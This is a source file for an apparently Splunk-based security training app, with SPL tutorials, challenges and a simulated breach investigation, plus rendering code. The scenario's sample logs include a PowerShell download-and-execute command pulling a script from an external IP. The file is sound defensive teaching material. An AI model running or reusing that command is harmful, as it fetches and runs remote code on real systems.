                                { '_time': '2024-01-15 04:00:00', 'source': 'Data - Large Email Attachment', 'risk_score': '5', 'risk_message': '60MB attachment to external' }
                            ]
                        },
                        finding: 'CLEAR ATTACK PATTERN: After-hours login → failed auth attempts → successful login from Russia → PowerShell execution → data exfiltration via email. This is a coordinated attack.'
                    },
                    {
                        question: 'The login from Russia is highly suspicious. Let\'s verify: is this user normally based in Russia?',
                        hint: 'Check identity data and normal login patterns.',
                        spl: '| makeresults | eval user="mthompson" | lookup identity_lookup_expanded identity as user | table user, first, last, city, country, bunit, priority | append [search index=risk earliest=-90d risk_object="mthompson" source="Access - Unusual Login Location" | stats count by risk_message]',
                        analysis: 'Check user profile and historical unusual location alerts.',
                        output: {
                            columns: ['user', 'first', 'last', 'city', 'country', 'bunit', 'priority'],
                            rows: [
                                { 'user': 'mthompson', 'first': 'Michael', 'last': 'Thompson', 'city': 'Denver', 'country': 'USA', 'bunit': 'Finance', 'priority': 'high' }
                            ]
                        },
                        finding: 'User is Michael Thompson from Finance in Denver. No historical logins from Russia. This is likely credential theft - someone is using his account remotely.'
                    },
                    {
                        question: 'What was the PowerShell activity? This could show attacker tools.',
                        hint: 'Look at the Endpoint data model or Sysmon logs.',
                        spl: 'index=sysmon EventCode=1 user="*mthompson*" process_name="powershell.exe" earliest=-48h | table _time, CommandLine | sort _time',
                        analysis: 'Review PowerShell commands executed by the compromised account.',
                        output: {
                            columns: ['_time', 'CommandLine'],
                            rows: [
                                { '_time': '2024-01-15 00:45:22', 'CommandLine': 'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcA...' },
                                { '_time': '2024-01-15 01:12:18', 'CommandLine': 'powershell.exe IEX(New-Object Net.WebClient).DownloadString("http://185.220.101.44/shell.ps1")' }
                            ]
                        },
                        finding: 'Attacker used classic PowerShell attack patterns: base64 encoded commands and download cradle from external IP (185.220.101.44). This is automated attack tooling.'
                    },
                    {
                        question: 'Finally, let\'s check those email attachments. Who received the large files?',
                        hint: 'Search email logs for external recipients.',
                        spl: 'index=email src_user="*mthompson*" attachment_size>10000000 earliest=-48h | table _time, src_user, recipient, attachment_name, attachment_size | sort _time',
                        analysis: 'Identify data exfiltration targets.',
                        output: {
                            columns: ['_time', 'src_user', 'recipient', 'attachment_name', 'attachment_size'],
                            rows: [
                                { '_time': '2024-01-15 02:30:15', 'src_user': 'mthompson@company.com', 'recipient': 'dropbox-upload@protonmail.com', 'attachment_name': 'Q4_Financial_Report.xlsx', 'attachment_size': '52428800' },
                                { '_time': '2024-01-15 03:15:42', 'src_user': 'mthompson@company.com', 'recipient': 'dropbox-upload@protonmail.com', 'attachment_name': 'Customer_Database_Export.csv', 'attachment_size': '78643200' },
                                { '_time': '2024-01-15 04:00:08', 'src_user': 'mthompson@company.com', 'recipient': 'dropbox-upload@protonmail.com', 'attachment_name': 'Employee_Salary_Data.xlsx', 'attachment_size': '62914560' }
                            ]
                        },
                        finding: 'Data exfiltration confirmed. Financial reports, customer database, and salary data sent to a suspicious Protonmail address. This is a major data breach.'
                    }
                ],
                conclusion: `<strong>Investigation Complete - Confirmed Account Compromise & Data Breach</strong><br><br>
                    <strong>Attack Timeline:</strong>
                    <ol>
                        <li>23:15 - Attacker accessed mthompson's account after hours</li>
                        <li>23:22 - Brief credential guessing (may have obtained partial creds)</li>
                        <li>23:24 - Successful login from Russia using compromised credentials</li>
                        <li>00:45-01:12 - Deployed PowerShell attack tools from external C2 (185.220.101.44)</li>
                        <li>02:30-04:00 - Exfiltrated 185MB of sensitive data to external email</li>
                    </ol>
                    <strong>Risk-Based Alerting Value:</strong> No single event would have triggered investigation. The combination of events - each low-to-medium severity alone - painted the complete picture.<br><br>
                    <strong>Immediate Actions:</strong>
                    <ol>
                        <li>Disable mthompson's account</li>
                        <li>Block C2 IP (185.220.101.44) at perimeter</li>
                        <li>Contact legal regarding data breach notification</li>
                        <li>Preserve evidence for forensics</li>
                    </ol>`
            }
        },
        {
            id: 'es-006',
            title: 'tstats vs stats: The ES Query Shift',
            type: 'tutorial',
            difficulty: 'intermediate',
            duration: '20 min',
            objectives: [
                'Understand when to use tstats vs stats',
                'Write efficient data model queries',
                'Translate standard searches to tstats'
            ],
            tags: ['es', 'tstats', 'datamodel', 'performance'],
            description: 'The most common ES syntax change: learning to query accelerated data models with tstats instead of raw indexes with stats.',
            content: {
                sections: [
                    {
                        title: 'The Core Difference',
                        body: `<p><strong>stats</strong> works on raw events from indexes:</p>
                        <pre class="spl-example">index=wineventlog EventCode=4625 | stats count by user</pre>
                        <p><strong>tstats</strong> works on accelerated data model summaries:</p>
                        <pre class="spl-example">| tstats count from datamodel=Authentication where Authentication.action="failure" by Authentication.user</pre>
                        <p>Both give you counts by user, but tstats is <strong>10-100x faster</strong> on large time ranges because it reads pre-computed summaries, not raw events.</p>`,
                        spl: null,
                        explanation: null
                    },
                    {
                        title: 'tstats Syntax Explained',
                        body: `<p>The tstats syntax has specific requirements:</p>`,
                        spl: '| tstats <aggregation> from datamodel=<Model> where <Model>.<field>=<value> by <Model>.<field>',
                        explanation: 'Key points: (1) Starts with pipe, (2) Field names include the data model prefix like "Authentication.user", (3) "from datamodel=" is required.'
                    },
                    {
                        title: 'Common Translation: Authentication',
                        body: `<p><strong>Standard Splunk:</strong></p>
                        <pre class="spl-example">index=wineventlog EventCode=4625 | stats count by TargetUserName, IpAddress</pre>
                        <p><strong>ES Data Model:</strong></p>`,
                        spl: '| tstats count from datamodel=Authentication where Authentication.action="failure" by Authentication.user, Authentication.src | rename Authentication.* as *',
                        explanation: 'The rename at the end strips the "Authentication." prefix for cleaner output. Notice we use normalized field names: "user" instead of "TargetUserName", "src" instead of "IpAddress".'
                    },
                    {
                        title: 'Common Translation: Network Traffic',
                        body: `<p><strong>Standard Splunk:</strong></p>
                        <pre class="spl-example">index=firewall | stats sum(bytes) as total_bytes by src_ip, dest_ip</pre>
                        <p><strong>ES Data Model:</strong></p>`,
                        spl: '| tstats sum(All_Traffic.bytes) as total_bytes from datamodel=Network_Traffic by All_Traffic.src, All_Traffic.dest | rename All_Traffic.* as *',
                        explanation: 'Network Traffic uses "All_Traffic" as the data model object name. Field mappings: src_ip→src, dest_ip→dest.'
                    },
                    {
                        title: 'When tstats Can\'t Help',
                        body: `<p>tstats has limitations. Use regular stats when:</p>
                        <ul>
                            <li><strong>Field not in model</strong> — tstats only sees indexed fields in the data model</li>
                            <li><strong>Need raw event details</strong> — tstats gives summaries, not individual events</li>
                            <li><strong>Complex filtering</strong> — Some regex or eval logic requires raw events</li>
                            <li><strong>Acceleration is behind</strong> — Very recent data may not be in summaries yet</li>
                        </ul>
                        <p><strong>Hybrid approach:</strong> Use tstats to identify interesting entities, then drill down to raw events:</p>`,
                        spl: '| tstats count from datamodel=Authentication where Authentication.action="failure" by Authentication.src | where count > 100 | map search="search index=wineventlog src_ip=$src$ EventCode=4625 | head 5"',
                        explanation: 'tstats finds sources with 100+ failures quickly, then map retrieves sample raw events for investigation.'
                    },
                    {
                        title: 'Quick Reference: Data Model Names',
                        body: `<p>Common ES data models and their object names:</p>
                        <table style="width:100%; border-collapse: collapse; margin: 1rem 0;">
                            <tr style="border-bottom: 1px solid var(--border-subtle);">
                                <th style="text-align:left; padding: 0.5rem;">Data Model</th>
                                <th style="text-align:left; padding: 0.5rem;">Object Name</th>
                                <th style="text-align:left; padding: 0.5rem;">Common Fields</th>
                            </tr>
                            <tr><td style="padding: 0.5rem;">Authentication</td><td>Authentication</td><td>user, src, dest, action, app</td></tr>
                            <tr><td style="padding: 0.5rem;">Network_Traffic</td><td>All_Traffic</td><td>src, dest, src_port, dest_port, bytes</td></tr>
                            <tr><td style="padding: 0.5rem;">Endpoint</td><td>Processes, Filesystem, etc.</td><td>process_name, user, dest</td></tr>
                            <tr><td style="padding: 0.5rem;">Web</td><td>Web</td><td>url, src, dest, status, action</td></tr>
                            <tr><td style="padding: 0.5rem;">Email</td><td>All_Email</td><td>src_user, recipient, subject</td></tr>
                        </table>`,
                        spl: null,
                        explanation: null
                    }
                ]
            }
        },
        {
            id: 'es-007',
            title: 'Asset and Identity Enrichment',
            type: 'tutorial',
            difficulty: 'intermediate',
            duration: '20 min',
            objectives: [
                'Understand ES asset and identity frameworks',
                'Use enrichment macros and lookups',
                'Add business context to investigations'
            ],
            tags: ['es', 'asset', 'identity', 'enrichment', 'lookup'],
            description: 'One of ES\'s biggest advantages: automatic enrichment with business context. Learn to leverage asset and identity data in your investigations.',
            content: {
                sections: [
                    {
                        title: 'Why Enrichment Matters',
                        body: `<p>In standard Splunk, an IP is just an IP. In ES, that IP becomes:</p>
                        <ul>
                            <li>Server name: <strong>DBPROD-01</strong></li>
                            <li>Owner: <strong>Database Team</strong></li>
                            <li>Priority: <strong>Critical</strong></li>
                            <li>Business Unit: <strong>Finance</strong></li>
                            <li>Category: <strong>Production Database</strong></li>
                        </ul>
                        <p>This context changes how you prioritize and investigate. A port scan against a workstation is different from a port scan against a production database.</p>`,
                        spl: null,
                        explanation: null
                    },
                    {
                        title: 'Asset Enrichment with get_asset',
                        body: `<p>The <code>\`get_asset(field)\`</code> macro enriches IP or hostname fields with asset data:</p>`,
                        spl: 'index=firewall dest_port=3389 | `get_asset(dest)` | table src, dest, nt_host, owner, priority, bunit, category',
                        explanation: 'This finds RDP connections and enriches the destination IP with asset context. Now you can see if someone is RDP\'ing to a critical server vs a workstation.'
                    },
                    {
                        title: 'Identity Enrichment with get_identity',
                        body: `<p>The <code>\`get_identity4events(field)\`</code> macro enriches usernames with identity data:</p>`,
                        spl: 'index=wineventlog EventCode=4625 | stats count by TargetUserName | `get_identity4events(TargetUserName)` | table TargetUserName, identity_first, identity_last, identity_bunit, identity_priority, count | sort -count',
                        explanation: 'This counts failed logins by user and adds identity context. You can now see if the targeted accounts are service accounts, executives, or regular users.'
                    },
                    {
                        title: 'Enriching Both Ends of a Connection',
                        body: `<p>For network events, enrich both source and destination:</p>`,
                        spl: 'index=firewall bytes_out > 100000000 | `get_asset(src)` | `get_asset(dest)` | rename src_* as source_*, dest_* as destination_* | table src, dest, source_nt_host, source_category, destination_nt_host, destination_category, bytes_out',
                        explanation: 'This finds large data transfers and shows asset context for both endpoints. You can quickly spot unusual patterns like "workstation → internet" with 100MB+ transfers.'
                    },
                    {
                        title: 'Direct Lookup Syntax',
                        body: `<p>Sometimes you need more control than the macros provide. Use lookups directly:</p>`,
                        spl: '| inputlookup asset_lookup_by_str | table ip, nt_host, owner, priority, bunit, category | head 20',
                        explanation: 'This shows the raw asset inventory data. You can also use: lookup asset_lookup_by_str ip as src_ip OUTPUT nt_host, owner, priority'
                    },
                    {
                        title: 'Priority-Based Triage',
                        body: `<p>Use asset priority to focus on what matters:</p>`,
                        spl: 'index=firewall action=blocked | `get_asset(dest)` | where priority IN ("critical", "high") | stats count by dest, nt_host, priority, category | sort -count',
                        explanation: 'This shows blocked traffic to critical/high priority assets. These deserve more attention than blocked traffic to low-priority workstations.'
                    }
                ]
            }
        },
        {
            id: 'es-008',
            title: 'Standard Splunk to ES Query Translation',
            type: 'challenge',
            difficulty: 'intermediate',
            duration: '15 min',
            objectives: [
                'Translate raw index queries to data model queries',
                'Use ES macros for enrichment',
                'Apply CIM field naming'
            ],
            tags: ['es', 'translation', 'datamodel', 'tstats'],
            description: 'Practice converting your existing Splunk searches to ES-optimized equivalents. This is the core skill for ES adoption.',
            content: {
                problem: 'Translate this standard Splunk search to an ES-optimized version using tstats and the Authentication data model:\n\nindex=wineventlog EventCode=4625 | stats count by TargetUserName, IpAddress | where count > 10 | sort -count',
                hints: [
                    'The Authentication data model normalizes login events',
                    'EventCode 4625 = failed authentication = action="failure"',
                    'TargetUserName maps to Authentication.user',
                    'IpAddress maps to Authentication.src',
                    'Remember to rename fields to strip the data model prefix'
                ],
                solution: {
                    spl: '| tstats count from datamodel=Authentication where Authentication.action="failure" by Authentication.user, Authentication.src | rename Authentication.* as * | where count > 10 | sort -count',
                    explanation: 'Key translations:\n• index=wineventlog EventCode=4625 → from datamodel=Authentication where Authentication.action="failure"\n• TargetUserName → Authentication.user\n• IpAddress → Authentication.src\n• stats → tstats (for accelerated data)\n\nThe tstats version will be dramatically faster on large time ranges because it queries pre-computed summaries instead of raw events.'
                },
                variations: [
                    {
                        description: 'Now add asset enrichment to see which workstations are being brute-forced:',
                        spl: '| tstats count from datamodel=Authentication where Authentication.action="failure" by Authentication.user, Authentication.src | rename Authentication.* as * | where count > 10 | `get_asset(src)` | table user, src, nt_host, owner, priority, count | sort -count'
                    },
                    {
                        description: 'Add time-based grouping to see the attack timeline:',
                        spl: '| tstats count from datamodel=Authentication where Authentication.action="failure" by _time span=1h, Authentication.user, Authentication.src | rename Authentication.* as * | where count > 10'
                    }
                ]
            }
        },
        {
            id: 'es-009',
            title: 'Notable Event Triage Challenge',
            type: 'challenge',
            difficulty: 'intermediate',
            duration: '15 min',
            objectives: [
                'Query and analyze notable events',
                'Use urgency and status for prioritization',
                'Build analyst workload reports'
            ],
            tags: ['es', 'notable', 'triage', 'workflow'],
            description: 'Practice the daily SOC workflow: querying notables, understanding workload, and identifying high-priority items.',
            content: {
                problem: 'You\'re the shift lead and need to understand the current notable backlog. Write a query that shows: count of open notables by urgency level, with the average age in hours for each urgency level.',
                hints: [
                    'Use the `notable` macro to query the notable index',
                    'Filter for open statuses: "new" or "in progress"',
                    'Calculate age using: (now() - _time) / 3600 for hours',
                    'Use stats to group by urgency and calculate averages'
                ],
                solution: {
                    spl: '`notable` | where status IN ("new", "in progress") | eval age_hours = round((now() - _time) / 3600, 1) | stats count as open_notables, avg(age_hours) as avg_age_hours by urgency | sort -urgency',
                    explanation: 'This gives you an instant view of the backlog:\n• How many open notables at each urgency level\n• How long they\'ve been waiting on average\n\nIf you see 50 critical notables with an average age of 12 hours, you have a problem. If you see 10 low-urgency notables averaging 48 hours, that might be acceptable.'
                },
                variations: [
                    {
                        description: 'Break down by analyst to see who\'s overloaded:',
                        spl: '`notable` | where status IN ("new", "in progress") | stats count as assigned by owner, urgency | xyseries owner urgency assigned | fillnull value=0'
                    },
                    {
                        description: 'Find notables that have been "in progress" too long (stale):',
                        spl: '`notable` | where status="in progress" | eval age_hours = (now() - _time) / 3600 | where age_hours > 24 | table _time, rule_name, urgency, owner, age_hours | sort -age_hours'
                    },
                    {
                        description: 'Show detection rule volume (which rules create the most work):',
                        spl: '`notable` earliest=-7d | stats count by rule_name | sort -count | head 20'
                    }
                ]
            }
        },
        {
            id: 'es-010',
            title: 'Building a Risk Investigation Query',
            type: 'challenge',
            difficulty: 'advanced',
            duration: '20 min',
            objectives: [
                'Query the risk index for entity analysis',
                'Correlate risk events with source detections',
                'Build investigation-ready risk summaries'
            ],
            tags: ['es', 'rba', 'risk', 'investigation'],
            description: 'Master the risk index queries that power RBA investigations. Build queries that tell the complete story of a high-risk entity.',
            content: {
                problem: 'A user "dlee" has been flagged as high-risk. Build a comprehensive risk summary that shows: total risk score, count of contributing detections, the individual detections with their scores, and the time range of suspicious activity.',
                hints: [
                    'Query index=risk with risk_object="dlee"',
                    'Use stats to calculate the total and per-source breakdown',
                    'earliest() and latest() functions can show the activity window',
                    'values() can list all unique detection sources'
                ],
                solution: {
                    spl: 'index=risk risk_object="dlee" earliest=-7d | stats sum(risk_score) as total_risk, dc(source) as detection_count, values(source) as detections, min(_time) as first_activity, max(_time) as last_activity | eval first_activity=strftime(first_activity, "%Y-%m-%d %H:%M"), last_activity=strftime(last_activity, "%Y-%m-%d %H:%M") | eval activity_window=first_activity." to ".last_activity',
                    explanation: 'This single query provides the investigation summary:\n• total_risk: Cumulative risk score\n• detection_count: Number of different rules that triggered\n• detections: List of all contributing detection names\n• activity_window: When the suspicious activity occurred\n\nThis is your starting point for any RBA investigation - the "executive summary" before you dig into details.'
                },
                variations: [
                    {
                        description: 'Break down by day to see if activity is ongoing:',
                        spl: 'index=risk risk_object="dlee" earliest=-7d | eval day=strftime(_time, "%Y-%m-%d") | stats sum(risk_score) as daily_risk, dc(source) as detections by day | sort day'
                    },
                    {
                        description: 'Show the risk contribution from each detection:',
                        spl: 'index=risk risk_object="dlee" earliest=-7d | stats sum(risk_score) as risk_contribution, count as events, latest(risk_message) as sample_message by source | sort -risk_contribution'
                    },
                    {
                        description: 'Compare this user\'s risk to their peers (same department):',
                        spl: 'index=risk earliest=-7d | lookup identity_lookup_expanded identity as risk_object OUTPUT bunit | where bunit="Finance" | stats sum(risk_score) as total_risk by risk_object | sort -total_risk | head 20'
                    }
                ]
            }
        }
    ]
};


// ============================================
// State Management
// ============================================

let currentTab = 'foundations';
let currentSearch = '';
let currentModalData = null;
let currentScenarioStep = 0;
let revealedHints = new Set();

// Multi-select filter states (empty Set = show all)
let typeFilters = new Set();
let domainFilters = new Set();

// Unified icon mapping for training cards
const CARD_ICONS = {
    tutorial: { icon: '▷', label: 'Tutorial' },
    scenario: { icon: '◎', label: 'Scenario' },
    challenge: { icon: '★', label: 'Challenge' }
};

// ============================================
// Initialization
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    initTrainingTabs();
    initFilters();
    initSearch();
    initModal();
    renderCurrentTab();
});

// ============================================
// Tab Management
// ============================================

function initTrainingTabs() {
    const savedTab = localStorage.getItem('trainingTab');
    if (savedTab && TRAINING_DATA[savedTab]) {
        currentTab = savedTab;
    }

    document.querySelectorAll('.tabs-list button').forEach(tab => {
        const tabId = tab.dataset.category;
        tab.classList.toggle('active', tabId === currentTab);
        tab.setAttribute('aria-selected', tabId === currentTab);

        tab.addEventListener('click', () => switchTab(tabId));
    });

    // Show the current panel
    updatePanelVisibility();
}

function switchTab(tabId) {
    if (!TRAINING_DATA[tabId]) return;

    currentTab = tabId;
    localStorage.setItem('trainingTab', tabId);

    document.querySelectorAll('.tabs-list button').forEach(tab => {
        const id = tab.dataset.category;
        tab.classList.toggle('active', id === tabId);
        tab.setAttribute('aria-selected', id === tabId);
    });

    updatePanelVisibility();
    renderCurrentTab();
}

function updatePanelVisibility() {
    document.querySelectorAll('.tab-panel').forEach(panel => {
        const panelId = panel.id.replace('Panel', '');
        const isActive = panelId === currentTab;
        panel.classList.toggle('active', isActive);
        panel.hidden = !isActive;
    });
}

// ============================================
// Filtering & Search
// ============================================

function initFilters() {
    // Initialize type filter
    initIconFilter('typeFilter', typeFilters);
    // Initialize domain filter
    initIconFilter('domainFilter', domainFilters);
}

// Unified icon filter initialization - supports multi-select toggle with "All" option
function initIconFilter(containerId, filterSet) {
    const filterContainer = document.getElementById(containerId);
    if (!filterContainer) return;

    const allBtn = filterContainer.querySelector('[data-filter="all"]');

    filterContainer.addEventListener('click', (e) => {
        const btn = e.target.closest('.icon-filter-btn');
        if (!btn) return;

        const filterValue = btn.dataset.filter;

        if (filterValue === 'all') {
            // "All" clicked - clear all filters and activate only "All"
            filterSet.clear();
            filterContainer.querySelectorAll('.icon-filter-btn').forEach(b => {
                b.classList.toggle('active', b.dataset.filter === 'all');
            });
        } else {
            // Specific filter clicked - toggle it
            if (filterSet.has(filterValue)) {
                filterSet.delete(filterValue);
                btn.classList.remove('active');
            } else {
                filterSet.add(filterValue);
                btn.classList.add('active');
            }

            // Update "All" button state
            if (allBtn) {
                if (filterSet.size === 0) {
                    // No filters selected - activate "All"
                    allBtn.classList.add('active');
                } else {
                    // Some filters selected - deactivate "All"
                    allBtn.classList.remove('active');
                }
            }
        }

        renderCurrentTab();
    });
}

function initSearch() {
    const searchInput = document.getElementById('trainingSearch');
    if (searchInput) {
        searchInput.addEventListener('input', debounce((e) => {
            currentSearch = e.target.value.toLowerCase();
            renderCurrentTab();
        }, 200));
    }
}

function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// ============================================
// Rendering
// ============================================

function renderCurrentTab() {
    const grid = document.getElementById(`${currentTab}Grid`);
    const emptyState = document.getElementById('trainingEmptyState');

    if (!grid) return;

    const modules = filterModules(TRAINING_DATA[currentTab] || []);

    if (modules.length === 0) {
        grid.innerHTML = '';
        emptyState?.classList.remove('hidden');
        return;
    }

    emptyState?.classList.add('hidden');
    grid.innerHTML = modules.map(module => renderTrainingCard(module)).join('');

    // Add click handlers
    grid.querySelectorAll('.training-card').forEach(card => {
        card.addEventListener('click', () => {
            const moduleId = card.dataset.id;
            openTrainingModal(moduleId);
        });
    });
}

function filterModules(modules) {
    return modules.filter(module => {
        // Type filter (multi-select: empty = show all)
        if (typeFilters.size > 0 && !typeFilters.has(module.type)) {
            return false;
        }

        // Domain filter (multi-select: empty = show all)
        if (domainFilters.size > 0) {
            // Check if any of the module's tags match any selected domain
            const hasMatchingDomain = module.tags.some(tag => {
                const tagLower = tag.toLowerCase();
                for (const domain of domainFilters) {
                    if (tagLower.includes(domain.toLowerCase())) {
                        return true;
                    }
                }
                return false;
            });
            if (!hasMatchingDomain) return false;
        }

        // Search filter
        if (currentSearch) {
            const searchText = `${module.title} ${module.description} ${module.tags.join(' ')}`.toLowerCase();
            if (!searchText.includes(currentSearch)) {
                return false;
            }
        }

        return true;
    });
}

function renderTrainingCard(module) {
    const tagHtml = module.tags.slice(0, 3).map(tag =>
        `<span class="training-tag">${tag}</span>`
    ).join('');

    // Build card icon (positioned top-right like glossary cards)
    let cardIcon = '';
    if (CARD_ICONS[module.type]) {
        const { icon, label } = CARD_ICONS[module.type];
        cardIcon = `<span class="card-icon ${module.type}" title="${label}">${icon}</span>`;
    }

    return `
        <div class="training-card" data-id="${module.id}" data-type="${module.type}" data-difficulty="${module.difficulty}">
            ${cardIcon}
            <div class="training-card-header">
                <span class="training-difficulty ${module.difficulty}">${capitalize(module.difficulty)}</span>
            </div>
            <h3 class="training-card-title">${module.title}</h3>
            <p class="training-card-description">${module.description}</p>
            <div class="training-card-meta">
                <span class="training-duration">${module.duration}</span>
                <div class="training-tags">${tagHtml}</div>
            </div>
        </div>
    `;
}

// ============================================
// Modal Management
// ============================================

function initModal() {
    const modal = document.getElementById('trainingModal');
    const overlay = document.getElementById('trainingModalOverlay');
    const closeBtn = document.getElementById('trainingModalClose');

    if (overlay) overlay.addEventListener('click', closeModal);
    if (closeBtn) closeBtn.addEventListener('click', closeModal);

    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') closeModal();
    });
}

function findModule(moduleId) {
    for (const tab of Object.values(TRAINING_DATA)) {
        const module = tab.find(m => m.id === moduleId);
        if (module) return module;
    }
    return null;
}

function openTrainingModal(moduleId) {
    const module = findModule(moduleId);
    if (!module) return;

    currentModalData = module;
    currentScenarioStep = 0;
    revealedHints = new Set();

    const modal = document.getElementById('trainingModal');
    const typeBadge = document.getElementById('modalTypeBadge');
    const difficulty = document.getElementById('modalDifficulty');
    const duration = document.getElementById('modalDuration');
    const title = document.getElementById('trainingModalTitle');
    const objectives = document.getElementById('trainingModalObjectives');
    const body = document.getElementById('trainingModalBody');
    const nav = document.getElementById('trainingModalNav');

    typeBadge.textContent = module.type;
    typeBadge.className = `training-type-badge ${module.type}`;
    difficulty.textContent = capitalize(module.difficulty);
    difficulty.className = `training-difficulty ${module.difficulty}`;
    duration.textContent = module.duration;
    title.textContent = module.title;

    // Render objectives
    objectives.innerHTML = `
        <h4>Learning Objectives</h4>
        <ul>
            ${module.objectives.map(obj => `<li>${obj}</li>`).join('')}
        </ul>
    `;

    // Render content based on type
    switch (module.type) {
        case 'tutorial':
            body.innerHTML = renderTutorialContent(module.content);
            nav.innerHTML = '';
            break;
        case 'scenario':
            body.innerHTML = renderScenarioContent(module.content);
            nav.innerHTML = renderScenarioNav(module.content.steps.length);
            initScenarioInteractivity();
            break;
        case 'challenge':
            body.innerHTML = renderChallengeContent(module.content);
            nav.innerHTML = '';
            initChallengeInteractivity();
            break;
    }

    // Add copy button handlers
    body.querySelectorAll('.training-spl-copy').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            const spl = btn.closest('.training-spl-block').querySelector('.training-spl-code').textContent;
            copyToClipboard(spl, btn);
        });
    });

    modal.classList.add('active');
    document.body.style.overflow = 'hidden';
}

function closeModal() {
    const modal = document.getElementById('trainingModal');
    modal.classList.remove('active');
    document.body.style.overflow = '';
    currentModalData = null;
}

// ============================================
// Tutorial Rendering
// ============================================

function renderTutorialContent(content) {
    return content.sections.map(section => `
        <div class="tutorial-section">
            <h3 class="tutorial-section-title">${section.title}</h3>
            <div class="tutorial-section-body">${section.body}</div>
            ${section.spl ? renderSplBlock(section.spl, section.explanation) : ''}
        </div>
    `).join('');
}

// ============================================
// Scenario Rendering
// ============================================

function renderScenarioContent(content) {
    const situationHtml = `
        <div class="scenario-situation">
            <h3>Situation</h3>
            <p>${content.situation}</p>
        </div>
    `;

    const stepsHtml = content.steps.map((step, index) => `
        <div class="scenario-card" data-step="${index}">
            <div class="scenario-card-header">
                <span class="scenario-card-number">${index + 1}</span>
                <p class="scenario-card-question">${step.question}</p>
                <span class="scenario-card-toggle">
                    <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                        <path d="M4 6L8 10L12 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                </span>
            </div>
            <div class="scenario-card-body">
                ${renderSplBlock(step.spl, step.analysis)}
                ${step.output ? renderScenarioOutput(step.output) : ''}
                <div class="scenario-card-finding">
                    <p>${step.finding}</p>
                </div>
            </div>
        </div>
    `).join('');

    const conclusionHtml = `
        <div class="scenario-conclusion">
            <h3>Conclusion</h3>
            <p>${content.conclusion}</p>
        </div>
    `;

    return situationHtml + '<div class="scenario-narrative">' + stepsHtml + '</div>' + conclusionHtml;
}

function renderScenarioOutput(output) {
    if (!output || !output.columns) return '';

    // Handle empty results
    if (output.rows.length === 0) {
        return `
            <div class="scenario-output">
                <div class="scenario-output-header">
                    <span class="scenario-output-label">Results</span>
                </div>
                <div class="scenario-output-empty">${output.emptyMessage || 'No results found'}</div>
            </div>
        `;
    }

    // Build table header
    const headerHtml = output.columns.map(col => `<th>${col}</th>`).join('');

    // Build table rows
    const rowsHtml = output.rows.map(row => {
        const cells = output.columns.map(col => `<td>${row[col] || '-'}</td>`).join('');
        return `<tr>${cells}</tr>`;
    }).join('');

    // Truncation indicator
    const truncatedHtml = output.truncated
        ? `<div class="scenario-output-truncated">${output.truncated}</div>`
        : '';

    // Note (for additional context like unit conversions)
    const noteHtml = output.note
        ? `<div class="scenario-output-note">${output.note}</div>`
        : '';

    return `
        <div class="scenario-output">
            <div class="scenario-output-header">
                <span class="scenario-output-label">Results</span>
            </div>
            <div class="scenario-output-table-wrapper">
                <table class="scenario-output-table">
                    <thead><tr>${headerHtml}</tr></thead>
                    <tbody>${rowsHtml}</tbody>
                </table>
            </div>
            ${noteHtml}
            ${truncatedHtml}
        </div>
    `;
}

function renderScenarioNav(totalSteps) {
    // Scenarios are now narrative walkthroughs - no navigation needed
    return '';
}

function initScenarioInteractivity() {
    // Collapsible scenario cards
    document.querySelectorAll('.scenario-card-header').forEach(header => {
        header.addEventListener('click', () => {
            const card = header.closest('.scenario-card');
            card.classList.toggle('expanded');
        });
    });
}


// ============================================
// Challenge Rendering
// ============================================

function renderChallengeContent(content) {
    const problemHtml = `
        <div class="challenge-problem">
            <h3>Challenge</h3>
            <p>${content.problem}</p>
        </div>
    `;

    const hintsHtml = `
        <div class="challenge-hints">
            <h4>Hints (click to reveal)</h4>
            ${content.hints.map((hint, index) => `
                <div class="challenge-hint" data-hint="${index}">
                    <span class="challenge-hint-number">${index + 1}</span>
                    <span class="challenge-hint-text">${hint}</span>
                </div>
            `).join('')}
        </div>
    `;

    const solutionHtml = `
        <div class="challenge-solution">
            <div class="challenge-solution-header">
                <h4>Solution</h4>
                <button class="show-solution-btn" id="showSolutionBtn">Show Solution</button>
            </div>
            <div class="challenge-solution-content" id="challengeSolutionContent">
                ${renderSplBlock(content.solution.spl, content.solution.explanation)}
                ${content.variations ? renderVariations(content.variations) : ''}
            </div>
        </div>
    `;

    return problemHtml + hintsHtml + solutionHtml;
}

function renderVariations(variations) {
    return `
        <div class="challenge-variations">
            <h4>Try These Variations</h4>
            ${variations.map(v => `
                <div class="challenge-variation">
                    <p class="challenge-variation-desc">${v.description}</p>
                    ${renderSplBlock(v.spl, null)}
                </div>
            `).join('')}
        </div>
    `;
}

function initChallengeInteractivity() {
    // Hint clicks
    document.querySelectorAll('.challenge-hint').forEach(hint => {
        hint.addEventListener('click', () => {
            hint.classList.add('revealed');
        });
    });

    // Show solution
    const showBtn = document.getElementById('showSolutionBtn');
    const solutionContent = document.getElementById('challengeSolutionContent');

    if (showBtn && solutionContent) {
        showBtn.addEventListener('click', () => {
            solutionContent.classList.add('visible');
            showBtn.style.display = 'none';
        });
    }
}

// ============================================
// SPL Block Rendering
// ============================================

function renderSplBlock(spl, explanation) {
    const highlightedSpl = highlightSpl(spl);

    return `
        <div class="training-spl-block">
            <div class="training-spl-header">
                <span class="training-spl-label">SPL Query</span>
                <button class="training-spl-copy">Copy</button>
            </div>
            <pre class="training-spl-code">${highlightedSpl}</pre>
            ${explanation ? `<div class="training-spl-explanation">${explanation}</div>` : ''}
        </div>
    `;
}

function highlightSpl(spl, formatPipelines = true) {
    if (!spl) return '';

    // Escape HTML first
    let highlighted = spl.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

    // Use placeholders to avoid regex conflicts between replacements
    const placeholders = [];
    const addPlaceholder = (text, className) => {
        const id = `__SPL_${placeholders.length}__`;
        placeholders.push({ id, text, className });
        return id;
    };

    // Strings (quoted) - do first to protect quoted content
    highlighted = highlighted.replace(/"([^"]+)"/g, (match, content) => {
